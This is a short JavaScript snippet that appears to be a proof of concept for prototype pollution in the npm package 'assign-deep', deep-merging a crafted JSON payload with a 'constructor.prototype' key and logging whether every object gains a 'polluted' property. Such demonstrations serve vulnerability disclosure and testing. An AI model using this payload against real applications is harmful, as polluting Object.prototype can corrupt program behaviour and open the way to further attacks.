var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const assign = require('assign-deep');
const payloads = ['{"constructor": {"prototype": {"polluted":"yes"}}}'];
var obj = {};
console.log({}.polluted);
assign(obj, JSON.parse(payloads[0]));
console.log({}.polluted);